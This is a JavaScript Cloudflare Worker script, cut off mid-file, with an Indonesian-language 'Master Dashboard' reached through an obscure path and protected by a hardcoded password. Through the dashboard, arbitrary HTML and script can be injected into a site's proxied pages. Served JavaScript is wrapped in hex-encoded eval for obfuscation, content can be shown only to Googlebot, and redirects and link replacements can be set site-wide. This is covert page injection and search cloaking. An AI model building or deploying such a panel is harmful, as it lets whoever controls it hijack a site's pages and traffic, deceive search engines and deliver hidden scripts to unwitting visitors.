const MASTER_PATH = "/__crot_di_lp";
const ADMIN_PASSWORD = "gantengku168";

const SESSION_COOKIE = "cfmaster";
const SESSION_TTL_SECONDS = 60 * 60 * 24 * 7;

const REDIRECT_STORE_KEY = "redir:__store";

const PANEL_FILE_PREFIX = "file:";
const PANEL_FILE_INDEX_KEY = "file:__index";
const PANEL_INJIDX_PREFIX = "pinj:";

const URLREP_KEY = "urlrep:__rules";

const CACHE_MED = 60 * 1000;

const STATIC_EXT_RE = /\.(css|js|mjs|map|png|jpg|jpeg|gif|svg|ico|webp|avif|woff|woff2|ttf|eot|mp4|webm|pdf|zip|gz|br|json|xml|txt)$/i;

const MEM = new Map();
const INFLIGHT = new Map();

function nowMs() {
  return Date.now();
}

function memGet(key) {
  const item = MEM.get(key);
  if (!item) return undefined;
  if (item.exp > nowMs()) return item.val;
  MEM.delete(key);
  return undefined;
}

function memSet(key, val, ttlMs) {
  MEM.set(key, {
    val,
    exp: nowMs() + ttlMs,
  });
  return val;
}

function memDelPrefix(prefix) {
  for (const key of MEM.keys()) {
    if (key.startsWith(prefix)) MEM.delete(key);
  }
}

function isKvLimitErr(err) {
  const msg = String(err && (err.stack || err.message || err));
  return msg.includes("get() limit exceeded") || msg.includes("limit exceeded");
}

async function kvGet(ns, nsName, key, ttlMs = CACHE_MED) {
  if (!ns) return null;

  const blockedKey = nsName + ":blocked";
  const blockedUntil = memGet(blockedKey);

  if (blockedUntil && nowMs() < blockedUntil) return null;

  const cacheKey = nsName + ":get:" + key;
  const cached = memGet(cacheKey);

  if (cached !== undefined) return cached;

  if (INFLIGHT.has(cacheKey)) {
    return INFLIGHT.get(cacheKey);
  }

  const p = ns
    .get(key)
    .then((val) => memSet(cacheKey, val, ttlMs))
    .catch((err) => {
      if (isKvLimitErr(err)) {
        memSet(blockedKey, nowMs() + 10 * 60 * 1000, 10 * 60 * 1000);
        memSet(cacheKey, null, 10 * 60 * 1000);
        return null;
      }

      throw err;
    })
    .finally(() => {
      INFLIGHT.delete(cacheKey);
    });

  INFLIGHT.set(cacheKey, p);

  return p;
}

async function kvGetJson(ns, nsName, key, fallback, ttlMs = CACHE_MED) {
  const raw = await kvGet(ns, nsName, key, ttlMs);
  if (!raw) return fallback;

  try {
    return JSON.parse(raw);
  } catch {
    return fallback;
  }
}

async function kvPut(ns, nsName, key, val, options) {
  if (!ns) throw new Error("Missing KV binding: " + nsName);

  await ns.put(key, val, options);

  memSet(nsName + ":get:" + key, val, CACHE_MED);
}

async function kvDel(ns, nsName, key) {
  if (!ns) throw new Error("Missing KV binding: " + nsName);

  await ns.delete(key);

  MEM.delete(nsName + ":get:" + key);
}

function kv301(env) {
  return env.kv301;
}

function kvp(env) {
  return env.kvpanels;
}

function textResp(text, status = 200, headers = {}) {
  return new Response(text, {
    status,
    headers: {
      "content-type": "text/plain; charset=utf-8",
      ...headers,
    },
  });
}

function htmlResp(html, status = 200, headers = {}) {
  return new Response(html, {
    status,
    headers: {
      "content-type": "text/html; charset=utf-8",
      ...headers,
    },
  });
}

function jsonResp(obj, status = 200) {
  return new Response(JSON.stringify(obj, null, 2), {
    status,
    headers: {
      "content-type": "application/json; charset=utf-8",
    },
  });
}

function redirectHere(req, to, status = 303) {
  const url = new URL(to, req.url);
  return Response.redirect(url.toString(), status);
}

function parseCookie(header) {
  const out = {};
  if (!header) return out;

  for (const part of header.split(";")) {
    const idx = part.indexOf("=");
    if (idx === -1) continue;

    const k = part.slice(0, idx).trim();
    const v = part.slice(idx + 1).trim();

    out[k] = decodeURIComponent(v);
  }

  return out;
}

async function sha256Hex(text) {
  const data = new TextEncoder().encode(text);
  const hash = await crypto.subtle.digest("SHA-256", data);
  return Array.from(new Uint8Array(hash))
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("");
}

async function makeSessionToken() {
  const exp = Math.floor(Date.now() / 1000) + SESSION_TTL_SECONDS;
  const sig = await sha256Hex(String(exp) + ":" + ADMIN_PASSWORD);
  return exp + "." + sig;
}

async function verifySessionToken(token) {
  if (!token || !token.includes(".")) return false;

  const [expRaw, sig] = token.split(".");
  const exp = Number(expRaw);

  if (!Number.isFinite(exp)) return false;
  if (Math.floor(Date.now() / 1000) > exp) return false;

  const expected = await sha256Hex(String(exp) + ":" + ADMIN_PASSWORD);

  return sig === expected;
}

async function isLoggedIn(req) {
  const cookies = parseCookie(req.headers.get("cookie") || "");
  return verifySessionToken(cookies[SESSION_COOKIE]);
}

function loginCookie(token) {
  return `${SESSION_COOKIE}=${encodeURIComponent(token)}; Max-Age=${SESSION_TTL_SECONDS}; Path=${MASTER_PATH}; HttpOnly; SameSite=Lax; Secure`;
}

function logoutCookie() {
  return `${SESSION_COOKIE}=; Max-Age=0; Path=${MASTER_PATH}; HttpOnly; SameSite=Lax; Secure`;
}

function escapeHtml(s) {
  return String(s ?? "")
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");
}

function normalizePathname(pathname) {
  if (!pathname) return "/";
  let p = String(pathname).trim();

  if (!p.startsWith("/")) p = "/" + p;

  try {
    p = new URL("https://x.test" + p).pathname;
  } catch {}

  return p || "/";
}

function normalizeVirtualFilePath(input) {
  if (!input) return "";

  let s = String(input).trim();

  if (!s) return "";

  if (/^https?:\/\//i.test(s)) {
    try {
      const u = new URL(s);
      s = u.pathname;
    } catch {}
  }

  s = s.replace(/^\/https?:\/+/i, "/");
  s = s.replace(/\\/g, "/");

  if (!s.startsWith("/")) s = "/" + s;

  s = s.replace(/\/{2,}/g, "/");

  if (s === "/") return "";

  return s;
}

function fileKey(path) {
  return PANEL_FILE_PREFIX + normalizeVirtualFilePath(path);
}

function injKey(matchPath) {
  return PANEL_INJIDX_PREFIX + normalizePathname(matchPath);
}

function normalizeHost(host) {
  return String(host || "")
    .toLowerCase()
    .replace(/^www\./, "")
    .trim();
}

function splitLines(s) {
  return String(s || "")
    .split(/\r?\n/)
    .map((x) => x.trim())
    .filter(Boolean);
}

function contentTypeByPath(path) {
  const p = String(path || "").toLowerCase();

  if (p.endsWith(".html") || p.endsWith(".htm")) return "text/html; charset=utf-8";
  if (p.endsWith(".css")) return "text/css; charset=utf-8";
  if (p.endsWith(".js") || p.endsWith(".mjs")) return "application/javascript; charset=utf-8";
  if (p.endsWith(".json")) return "application/json; charset=utf-8";
  if (p.endsWith(".xml")) return "application/xml; charset=utf-8";
  if (p.endsWith(".txt")) return "text/plain; charset=utf-8";
  if (p.endsWith(".svg")) return "image/svg+xml";
  if (p.endsWith(".png")) return "image/png";
  if (p.endsWith(".jpg") || p.endsWith(".jpeg")) return "image/jpeg";
  if (p.endsWith(".gif")) return "image/gif";
  if (p.endsWith(".webp")) return "image/webp";
  if (p.endsWith(".ico")) return "image/x-icon";

  return "application/octet-stream";
}

function isGooglebotUA(ua) {
  ua = String(ua || "").toLowerCase();

  return (
    ua.includes("googlebot") ||
    ua.includes("google-inspectiontool") ||
    ua.includes("googleother") ||
    ua.includes("apis-google")
  );
}

function uaAllowed(entry, req) {
  if (!entry) return false;

  if (entry.uaMode === "googlebot") {
    return isGooglebotUA(req.headers.get("user-agent") || "");
  }

  return true;
}

function hexJsString(s) {
  return String(s || "")
    .split("")
    .map((ch) => {
      const code = ch.charCodeAt(0);
      if (code <= 0xff) return "\\x" + code.toString(16).padStart(2, "0");
      return "\\u" + code.toString(16).padStart(4, "0");
    })
    .join("");
}

function dynamicFileBody(path, content) {
  if (String(path).toLowerCase().endsWith(".js")) {
    return `(function(){eval("${hexJsString(content)}");})();`;
  }

  return content;
}

async function getRedirectStore(env) {
  const fallback = {
    exact: {},
    wide: [],
  };

  const store = await kvGetJson(kv301(env), "kv301", REDIRECT_STORE_KEY, fallback);

  if (!store || typeof store !== "object") return fallback;
  if (!store.exact || typeof store.exact !== "object") store.exact = {};
  if (!Array.isArray(store.wide)) store.wide = [];

  return store;
}

async function putRedirectStore(env, store) {
  await kvPut(kv301(env), "kv301", REDIRECT_STORE_KEY, JSON.stringify(store));
}

function normalizeRedirectCode(code) {
  const n = Number(code);
  if ([301, 302, 307, 308].includes(n)) return n;
  return 301;
}

function buildRedirectTarget(reqUrl, rule) {
  const url = new URL(reqUrl);
  const base = new URL(rule.to);

  let out = base.toString();

  if (rule.keepPath) {
    if (out.endsWith("/") && url.pathname.startsWith("/")) {
      out = out.slice(0, -1) + url.pathname;
    } else {
      out += url.pathname;
    }
  }

  if (rule.keepQuery && url.search) {
    const u = new URL(out);
    for (const [k, v] of url.searchParams.entries()) {
      u.searchParams.set(k, v);
    }
    out = u.toString();
  }

  return out;
}

function matchHostPattern(host, pattern) {
  host = normalizeHost(host);
  pattern = String(pattern || "").toLowerCase().trim();

  if (!pattern || pattern === "*") return true;

  pattern = pattern.replace(/^www\./, "");

  if (pattern.startsWith("*.")) {
    const root = normalizeHost(pattern.slice(2));
    return host === root || host.endsWith("." + root);
  }

  return host === normalizeHost(pattern);
}

function matchPathPattern(pathname, pattern) {
  pathname = normalizePathname(pathname);
  pattern = String(pattern || "/*").trim();

  if (!pattern || pattern === "*" || pattern === "/*") return true;

  if (!pattern.startsWith("/")) pattern = "/" + pattern;

  if (pattern.endsWith("*")) {
    const prefix = pattern.slice(0, -1);
    return pathname.startsWith(prefix);
  }

  return pathname === normalizePathname(pattern);
}

function findRedirect(req, store) {
  const url = new URL(req.url);
  const path = normalizePathname(url.pathname);

  const exactRule = store.exact[path];
  if (exactRule && exactRule.to) {
    return {
      to: exactRule.to,
      code: normalizeRedirectCode(exactRule.code),
    };
  }

  for (const rule of store.wide || []) {
    if (!rule || !rule.to) continue;

    if (
      matchHostPattern(url.hostname, rule.hostPattern) &&
      matchPathPattern(url.pathname, rule.pathPattern)
    ) {
      return {
        to: buildRedirectTarget(req.url, rule),
        code: normalizeRedirectCode(rule.code),
      };
    }
  }

  return null;
}

async function saveRedirectRule(env, form) {
  const store = await getRedirectStore(env);

  const type = form.get("redirect_type") === "wide" ? "wide" : "exact";
  const originalType = String(form.get("original_type") || "");
  const originalId = String(form.get("original_id") || "");

  const to = String(form.get("to") || "").trim();
  const code = normalizeRedirectCode(form.get("code"));

  if (!to || !/^https?:\/\//i.test(to)) {
    throw new Error("Target URL harus http/https");
  }

  if (originalType === "exact" && originalId) {
    delete store.exact[normalizePathname(originalId)];
  }

  if (originalType === "wide" && originalId) {
    store.wide = store.wide.filter((x) => x.id !== originalId);
  }

  if (type === "exact") {
    const from = normalizePathname(form.get("from") || "");

    store.exact[from] = {
      to,
      code,
      updatedAt: Date.now(),
    };
  } else {
    const id = originalId || crypto.randomUUID();

    store.wide.push({
      id,
      hostPattern: String(form.get("host_pattern") || "*").trim() || "*",
      pathPattern: String(form.get("path_pattern") || "/*").trim() || "/*",
      to,
      code,
      keepPath: form.get("keep_path") === "1",
      keepQuery: form.get("keep_query") === "1",
      updatedAt: Date.now(),
    });
  }

  await putRedirectStore(env, store);
}

async function deleteRedirectRule(env, form) {
  const store = await getRedirectStore(env);

  const type = form.get("redirect_type") === "wide" ? "wide" : "exact";
  const id = String(form.get("id") || "");

  if (type === "exact") {
    delete store.exact[normalizePathname(id)];
  } else {
    store.wide = store.wide.filter((x) => x.id !== id);
  }

  await putRedirectStore(env, store);
}

async function getFileIndex(env) {
  const idx = await kvGetJson(kvp(env), "kvpanels", PANEL_FILE_INDEX_KEY, {});
  return idx && typeof idx === "object" ? idx : {};
}

async function putFileIndex(env, idx) {
  await kvPut(kvp(env), "kvpanels", PANEL_FILE_INDEX_KEY, JSON.stringify(idx));
}

async function getPanelEntry(env, path) {
  path = normalizeVirtualFilePath(path);
  if (!path) return null;

  const entry = await kvGetJson(kvp(env), "kvpanels", fileKey(path), null);

  if (!entry || typeof entry !== "object") return null;

  entry.path = normalizeVirtualFilePath(entry.path || path);
  entry.content = String(entry.content || "");
  entry.matchPaths = String(entry.matchPaths || "");
  entry.targetAnchor = String(entry.targetAnchor || "");
  entry.injectHtml = String(entry.injectHtml || "");
  entry.uaMode = entry.uaMode === "googlebot" ? "googlebot" : "all";

  return entry;
}

async function getInjectIndex(env, matchPath) {
  const arr = await kvGetJson(kvp(env), "kvpanels", injKey(matchPath), []);
  return Array.isArray(arr) ? arr : [];
}

async function putInjectIndex(env, matchPath, arr) {
  arr = [...new Set(arr.map(normalizeVirtualFilePath).filter(Boolean))];

  if (arr.length) {
    await kvPut(kvp(env), "kvpanels", injKey(matchPath), JSON.stringify(arr));
  } else {
    await kvDel(kvp(env), "kvpanels", injKey(matchPath));
  }
}

async function removePanelInjectIndexes(env, path, oldEntry) {
  path = normalizeVirtualFilePath(path);

  const oldPaths = splitLines(oldEntry && oldEntry.matchPaths);

  for (const mp of oldPaths) {
    const arr = await getInjectIndex(env, mp);
    const next = arr.filter((x) => normalizeVirtualFilePath(x) !== path);
    await putInjectIndex(env, mp, next);
  }
}

async function syncPanelInjectIndexes(env, path, oldEntry, newEntry) {
  await removePanelInjectIndexes(env, path, oldEntry);

  const hasInject =
    newEntry.matchPaths.trim() &&
    newEntry.targetAnchor.trim() &&
    newEntry.injectHtml.trim();

  if (!hasInject) return;

  for (const mp of splitLines(newEntry.matchPaths)) {
    const arr = await getInjectIndex(env, mp);
    arr.push(path);
    await putInjectIndex(env, mp, arr);
  }
}

async function savePanelFile(env, form) {
  const path = normalizeVirtualFilePath(form.get("path"));

  if (!path) {
    throw new Error("Path file tidak valid");
  }

  const oldEntry = await getPanelEntry(env, path);

  const entry = {
    path,
    content: String(form.get("content") || ""),
    matchPaths: String(form.get("match_paths") || ""),
    targetAnchor: String(form.get("target_anchor") || ""),
    injectHtml: String(form.get("inject_html") || ""),
    uaMode: form.get("ua_mode") === "googlebot" ? "googlebot" : "all",
    updatedAt: Date.now(),
  };

  const hasInject = !!(
    entry.matchPaths.trim() &&
    entry.targetAnchor.trim() &&
    entry.injectHtml.trim()
  );

  await kvPut(
    kvp(env),
    "kvpanels",
    fileKey(path),
    JSON.stringify(entry),
    {
      metadata: {
        len: entry.content.length,
        uaMode: entry.uaMode,
        hasInject,
      },
    }
  );

  const idx = await getFileIndex(env);

  idx[path] = {
    len: entry.content.length,
    uaMode: entry.uaMode,
    hasInject,
  };

  await putFileIndex(env, idx);

  await syncPanelInjectIndexes(env, path, oldEntry, entry);

  memDelPrefix("dynfile:" + path + ":");
}

async function deletePanelFile(env, path) {
  path = normalizeVirtualFilePath(path);

  if (!path) return;

  const oldEntry = await getPanelEntry(env, path);

  await removePanelInjectIndexes(env, path, oldEntry);
  await kvDel(kvp(env), "kvpanels", fileKey(path));

  const idx = await getFileIndex(env);
  delete idx[path];

  await putFileIndex(env, idx);

  memDelPrefix("dynfile:" + path + ":");
}

async function serveVirtualFile(env, req, pathname) {
  const path = normalizeVirtualFilePath(pathname);
  const entry = await getPanelEntry(env, path);

  if (!entry) return null;
  if (!uaAllowed(entry, req)) return null;

  const body = dynamicFileBody(path, entry.content);

  return new Response(body, {
    status: 200,
    headers: {
      "content-type": contentTypeByPath(path),
      "cache-control": "no-store",
      "x-dynamic-file": "1",
    },
  });
}

async function getUrlReplaceRules(env) {
  const arr = await kvGetJson(kvp(env), "kvpanels", URLREP_KEY, []);
  return Array.isArray(arr) ? arr : [];
}

async function putUrlReplaceRules(env, arr) {
  arr = arr
    .filter((x) => x && String(x.from || "").length)
    .map((x) => ({
      from: String(x.from || ""),
      to: String(x.to || ""),
    }));

  await kvPut(kvp(env), "kvpanels", URLREP_KEY, JSON.stringify(arr));
}

async function applyUrlReplacer(env, html) {
  const rules = await getUrlReplaceRules(env);

  let out = html;

  for (const rule of rules) {
    if (!rule.from) continue;
    out = out.split(rule.from).join(rule.to || "");
  }

  return out;
}

function htmlInjectAfterTarget(html, targetAnchor, injectHtml) {
  if (!targetAnchor || !injectHtml) return html;

  const idx = html.indexOf(targetAnchor);

  if (idx === -1) return html;

  const pos = idx + targetAnchor.length;

  return html.slice(0, pos) + injectHtml + html.slice(pos);
}

async function applyPanelInjects(env, req, html) {
  const url = new URL(req.url);
  const path = normalizePathname(url.pathname);

  let candidates = [];

  const direct = await getInjectIndex(env, path);
  const root = path !== "/" ? await getInjectIndex(env, "/") : [];

  candidates.push(...direct, ...root);

  candidates = [...new Set(candidates.map(normalizeVirtualFilePath).filter(Boolean))];

  if (!candidates.length) return html;

  let out = html;

  for (const filePath of candidates) {
    const entry = await getPanelEntry(env, filePath);
    if (!entry) continue;
    if (!uaAllowed(entry, req)) continue;

    const matchPaths = splitLines(entry.matchPaths).map(normalizePathname);

    if (!matchPaths.includes(path) && !matchPaths.includes("/")) {
      continue;
    }

    out = htmlInjectAfterTarget(out, entry.targetAnchor, entry.injectHtml);
  }

  return out;
}

function cloneHeaders(headers) {
  const h = new Headers(headers);
  h.delete("content-length");
  return h;
}

async function maybeRewriteHtmlResponse(env, req, resp) {
  const ct = resp.headers.get("content-type") || "";

  if (!ct.includes("text/html")) return resp;

  let html = await resp.text();

  html = await applyPanelInjects(env, req, html);
  html = await applyUrlReplacer(env, html);

  return new Response(html, {
    status: resp.status,
    statusText: resp.statusText,
    headers: cloneHeaders(resp.headers),
  });
}

function head(title = "Master") {
  return `
<meta charset="utf-8">
<meta name="robots" content="noindex,nofollow">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>${escapeHtml(title)}</title>
<style>
*{box-sizing:border-box}
body{font-family:Arial,system-ui,sans-serif;margin:0;background:#f6f7f9;color:#111}
.wrap{max-width:1180px;margin:auto;padding:16px}
.top{display:flex;justify-content:space-between;gap:10px;flex-wrap:wrap;align-items:flex-start}
.card{background:#fff;border:1px solid #ddd;border-radius:10px;padding:13px;margin:12px 0}
h1{font-size:22px;margin:0 0 5px}
h2{font-size:16px;margin:0 0 10px}
.sub,.hint{font-size:12px;color:#666;line-height:1.5}
.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.grid3{display:grid;grid-template-columns:1fr 1fr 120px;gap:10px}
@media(max-width:850px){.grid2,.grid3{grid-template-columns:1fr}}
label{font-size:12px;font-weight:bold;margin:7px 0 4px;display:block}
input,select,textarea{width:100%;border:1px solid #ccc;border-radius:8px;padding:8px;font-size:13px;background:#fff}
textarea{min-height:96px;font-family:Consolas,monospace}
.btn{display:inline-flex;border:1px solid #bbb;background:#fff;color:#111;border-radius:8px;padding:8px 10px;text-decoration:none;cursor:pointer;font-size:13px;font-weight:bold}
.btnp{background:#111;color:#fff;border-color:#111}
.row{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-top:9px}
.ok{background:#ecfff3;border:1px solid #b9f0cd;color:#116b2d;padding:9px;border-radius:8px}
.err{background:#fff0f0;border:1px solid #ffc0c0;color:#b00020;padding:9px;border-radius:8px}
table{width:100%;border-collapse:collapse;font-size:13px}
th,td{border-bottom:1px solid #eee;text-align:left;padding:7px;vertical-align:top}
th{background:#fafafa;color:#555}
.break{word-break:break-word}
code{background:#f1f1f1;padding:2px 5px;border-radius:5px}
.checks{display:flex;gap:12px;flex-wrap:wrap;margin-top:8px}
.checks label{display:flex;gap:6px;align-items:center;margin:0}
.checks input{width:auto}
.login{min-height:100vh;display:grid;place-items:center;padding:15px}
.login .card{max-width:360px;width:100%}
.hide{display:none}
.tag{display:inline-block;background:#f1f1f1;border-radius:6px;padding:2px 6px;font-size:12px;font-weight:bold}
.linkbtn{border:0;background:none;padding:0;color:#b00020;text-decoration:underline;cursor:pointer;font:inherit}
</style>`;
}

function renderLogin(error = "") {
  return `<!doctype html>
<html>
<head>${head("Login")}</head>
<body>
<div class="login">
  <div class="card">
    <h1>Halo King</h1>
    <div class="sub">Silahkan login King...</div>
    ${error ? `<div class="err" style="margin-top:10px">${escapeHtml(error)}</div>` : ""}
    <form method="post" action="${MASTER_PATH}">
      <input type="hidden" name="action" value="login">
      <label>Password</label>
      <input type="password" name="password" autofocus required>
      <div class="row">
        <button class="btn btnp" type="submit">Login</button>
      </div>
    </form>
  </div>
</div>
</body>
</html>`;
}

function okText(ok) {
  return {
    redir_saved: "Redirect tersimpan.",
    redir_deleted: "Redirect dihapus.",
    file_saved: "File tersimpan.",
    file_deleted: "File dihapus.",
    badpath: "Path file tidak valid.",
    urlrep_saved: "URL replacer tersimpan.",
    urlrep_deleted: "URL replacer dihapus.",
    logout: "Kamu sudah logout.",
  }[String(ok || "")] || "";
}

function renderMasterDashboard({ redirectStore, fileIndex, current, urlRules, ok }) {
  const okMsg = okText(ok);

  const exactRows = Object.entries(redirectStore.exact || {})
    .sort((a, b) => a[0].localeCompare(b[0]))
    .map(([from, rule]) => {
      return `<tr>
<td><span class="tag">exact</span></td>
<td><code>${escapeHtml(from)}</code></td>
<td>-</td>
<td class="break">${escapeHtml(rule.to)}</td>
<td>${escapeHtml(rule.code || 301)}</td>
<td>-</td>
<td>
  <a href="#" class="editRedir"
    data-type="exact"
    data-id="${escapeHtml(from)}"
    data-from="${escapeHtml(from)}"
    data-to="${escapeHtml(rule.to)}"
    data-code="${escapeHtml(rule.code || 301)}">Edit</a>
  |
  <form method="post" action="${MASTER_PATH}" style="display:inline" onsubmit="return confirm('Delete redirect ini?')">
    <input type="hidden" name="action" value="del_redirect">
    <input type="hidden" name="redirect_type" value="exact">
    <input type="hidden" name="id" value="${escapeHtml(from)}">
    <button type="submit" class="linkbtn">Delete</button>
  </form>
</td>
</tr>`;
    })
    .join("");

  const wideRows = (redirectStore.wide || [])
    .map((rule) => {
      return `<tr>
<td><span class="tag">advanced</span></td>
<td><code>${escapeHtml(rule.hostPattern || "*")}</code></td>
<td><code>${escapeHtml(rule.pathPattern || "/*")}</code></td>
<td class="break">${escapeHtml(rule.to)}</td>
<td>${escapeHtml(rule.code || 301)}</td>
<td>${rule.keepPath ? "keepPath " : ""}${rule.keepQuery ? "keepQuery" : ""}</td>
<td>
  <a href="#" class="editRedir"
    data-type="wide"
    data-id="${escapeHtml(rule.id)}"
    data-host="${escapeHtml(rule.hostPattern || "*")}"
    data-path="${escapeHtml(rule.pathPattern || "/*")}"
    data-to="${escapeHtml(rule.to)}"
    data-code="${escapeHtml(rule.code || 301)}"
    data-keeppath="${rule.keepPath ? "1" : "0"}"
    data-keepquery="${rule.keepQuery ? "1" : "0"}">Edit</a>
  |
  <form method="post" action="${MASTER_PATH}" style="display:inline" onsubmit="return confirm('Delete advanced redirect ini?')">
    <input type="hidden" name="action" value="del_redirect">
    <input type="hidden" name="redirect_type" value="wide">
    <input type="hidden" name="id" value="${escapeHtml(rule.id)}">
    <button type="submit" class="linkbtn">Delete</button>
  </form>
</td>
</tr>`;
    })
    .join("");

  const fileRows = Object.entries(fileIndex || {})
    .sort((a, b) => a[0].localeCompare(b[0]))
    .map(([path, meta]) => {
      return `<tr>
<td><code>${escapeHtml(path)}</code></td>
<td>${escapeHtml(meta.len || 0)}</td>
<td>${meta.uaMode === "googlebot" ? "Googlebot" : "Semua"}</td>
<td>${meta.hasInject ? "Ya" : "-"}</td>
<td>
  <a href="${MASTER_PATH}?path=${encodeURIComponent(path)}">Edit</a>
  |
  <a href="${escapeHtml(path)}" target="_blank">Open</a>
  |
  <form method="post" action="${MASTER_PATH}" style="display:inline" onsubmit="return confirm('Delete file ini?')">
    <input type="hidden" name="action" value="del_file">
    <input type="hidden" name="path" value="${escapeHtml(path)}">
    <button type="submit" class="linkbtn">Delete</button>
  </form>
</td>
</tr>`;
    })
    .join("");

  const urlRepRows = (urlRules || [])
    .map((rule, idx) => {
      return `<tr>
<td class="break">${escapeHtml(rule.from)}</td>
<td class="break">${escapeHtml(rule.to)}</td>
<td>
  <a href="#" class="editUrlRep"
    data-idx="${idx}"
    data-from="${escapeHtml(rule.from)}"
    data-to="${escapeHtml(rule.to)}">Edit</a>
  |
  <form method="post" action="${MASTER_PATH}" style="display:inline" onsubmit="return confirm('Delete URL replacer?')">
    <input type="hidden" name="action" value="del_urlrep">
    <input type="hidden" name="idx" value="${idx}">
    <button type="submit" class="linkbtn">Delete</button>
  </form>
</td>
</tr>`;
    })
    .join("");

  const cur = current || {
    path: "",
    content: "",
    matchPaths: "",
    targetAnchor: "",
    injectHtml: "",
    uaMode: "all",
  };

  return `<!doctype html>
<html>
<head>${head("Master Dashboard")}</head>
<body>
<div class="wrap">

<div class="top">
  <div>
    <h1>Master Dashboard</h1>
    <div class="sub">By <b>OsmondGanteng ^_^</b>.</div>
  </div>
  <form method="post" action="${MASTER_PATH}">
    <input type="hidden" name="action" value="logout">
    <button class="btn">Logout</button>
  </form>
</div>

${okMsg ? `<div class="card"><div class="ok">${escapeHtml(okMsg)}</div></div>` : ""}

<div class="card">
  <h2>Redirect Manager</h2>
  <div class="hint">Support redirect <b>exact path</b>, <b>seluruh domain</b>, dan <b>wildcard subdomain</b>.</div>

  <form method="post" action="${MASTER_PATH}" id="redirForm">
    <input type="hidden" name="action" value="save_redirect">
    <input type="hidden" name="original_type" id="origType">
    <input type="hidden" name="original_id" id="origId">

    <label>Tipe Redirect</label>
    <select name="redirect_type" id="redirType">
      <option value="exact">Exact Path Redirect</option>
      <option value="wide">Advanced / Whole Domain</option>
    </select>

    <div id="exactBox">
      <label>From Path</label>
      <input name="from" id="fromInput" placeholder="/old-page atau /path.html">
    </div>

    <div id="wideBox" class="hide">
      <div class="grid2">
        <div>
          <label>Host Pattern</label>
          <input name="host_pattern" id="hostInput" placeholder="example.com / *.example.com / *">
        </div>
        <div>
          <label>Path Pattern</label>
          <input name="path_pattern" id="pathInput" placeholder="/* atau /promo">
        </div>
      </div>
      <div class="checks">
        <label><input type="checkbox" name="keep_path" id="keepPath" value="1" checked> Keep path</label>
        <label><input type="checkbox" name="keep_query" id="keepQuery" value="1" checked> Keep query</label>
      </div>
    </div>

    <div class="grid3">
      <div style="grid-column:span 2">
        <label>To URL / Base URL</label>
        <input name="to" id="toInput" placeholder="https://target.com/" required>
      </div>
      <div>
        <label>Code</label>
        <select name="code" id="codeInput">
          <option>301</option>
          <option>302</option>
          <option>307</option>
          <option>308</option>
        </select>
      </div>
    </div>

    <div class="row">
      <button class="btn btnp">Simpan Redirect</button>
      <button class="btn" type="button" id="clearRedir">Clear</button>
    </div>
  </form>

  <table style="margin-top:12px">
    <thead>
      <tr>
        <th>Tipe</th>
        <th>Host / From</th>
        <th>Path Pattern</th>
        <th>To</th>
        <th>Code</th>
        <th>Flags</th>
        <th>Action</th>
      </tr>
    </thead>
    <tbody>${exactRows + wideRows || `<tr><td colspan="7">Belum ada redirect.</td></tr>`}</tbody>
  </table>
</div>

<div class="card">
  <h2>Dynamic File Inject</h2>

  <form method="post" action="${MASTER_PATH}" id="fileForm">
    <input type="hidden" name="action" value="save_file">

    <label>File Path</label>
    <input name="path" id="filePathInput" value="${escapeHtml(cur.path)}" placeholder="/nama-file.js atau /dir/file.js" required>

    <div class="hint">Kalau file .js, output otomatis dibungkus hex eval seperti versi obfus.</div>

    <label>UA Mode</label>
    <select name="ua_mode" id="fileUaMode">
      <option value="all" ${cur.uaMode !== "googlebot" ? "selected" : ""}>All User</option>
      <option value="googlebot" ${cur.uaMode === "googlebot" ? "selected" : ""}>Googlebot</option>
    </select>

    <label>Isi File</label>
    <textarea name="content" id="fileContent" style="min-height:170px">${escapeHtml(cur.content)}</textarea>

    <div class="grid2">
      <div>
        <label>Match Path</label>
        <textarea name="match_paths" id="fileMatchPaths" placeholder="/&#10;/contact&#10;/about/&#10;product.html">${escapeHtml(cur.matchPaths)}</textarea>
      </div>
      <div>
        <label>Target Anchor</label>
        <textarea name="target_anchor" id="fileTargetAnchor" placeholder="<!-- ValidString=[] -->">${escapeHtml(cur.targetAnchor)}</textarea>
      </div>
    </div>

    <label>Inject After Target Anchor</label>
    <textarea name="inject_html" id="fileInjectHtml" placeholder='<script src="/file.js"></script>'>${escapeHtml(cur.injectHtml)}</textarea>

    <div class="row">
      <button class="btn btnp">Simpan File</button>
      <button class="btn" type="button" id="clearFile">Clear</button>
    </div>
  </form>

  <table style="margin-top:12px">
    <thead>
      <tr>
        <th>Path</th>
        <th>Len</th>
        <th>UA</th>
        <th>Inject</th>
        <th>Action</th>
      </tr>
    </thead>
    <tbody>${fileRows || `<tr><td colspan="5">Belum ada file.</td></tr>`}</tbody>
  </table>
</div>

<div class="card">
  <h2>URL Replacer</h2>

  <form method="post" action="${MASTER_PATH}" id="urlRepForm">
    <input type="hidden" name="action" value="add_urlrep">
    <input type="hidden" name="urlrep_idx" id="urlRepIdx">

    <div class="grid2">
      <div>
        <label>From</label>
        <textarea name="from" id="urlRepFrom" placeholder="https://lama.com/"></textarea>
      </div>
      <div>
        <label>To</label>
        <textarea name="to" id="urlRepTo" placeholder="https://baru.com/"></textarea>
      </div>
    </div>

    <div class="row">
      <button class="btn btnp">Simpan URL Replacer</button>
      <button class="btn" type="button" id="clearUrlRep">Clear</button>
    </div>
  </form>

  <table style="margin-top:12px">
    <thead>
      <tr>
        <th>From</th>
        <th>To</th>
        <th>Action</th>
      </tr>
    </thead>
    <tbody>${urlRepRows || `<tr><td colspan="3">Belum ada URL replacer.</td></tr>`}</tbody>
  </table>
</div>

</div>

<script>
const redirType = document.getElementById('redirType');
const exactBox = document.getElementById('exactBox');
const wideBox = document.getElementById('wideBox');

function syncRedir() {
  const w = redirType.value === 'wide';
  exactBox.classList.toggle('hide', w);
  wideBox.classList.toggle('hide', !w);
}

redirType.addEventListener('change', syncRedir);
syncRedir();

function clearRedirForm() {
  redirType.value = 'exact';
  origType.value = '';
  origId.value = '';
  fromInput.value = '';
  hostInput.value = '';
  pathInput.value = '';
  toInput.value = '';
  codeInput.value = '301';
  keepPath.checked = true;
  keepQuery.checked = true;
  syncRedir();
}

clearRedir.onclick = clearRedirForm;

document.querySelectorAll('.editRedir').forEach((b) => {
  b.onclick = (e) => {
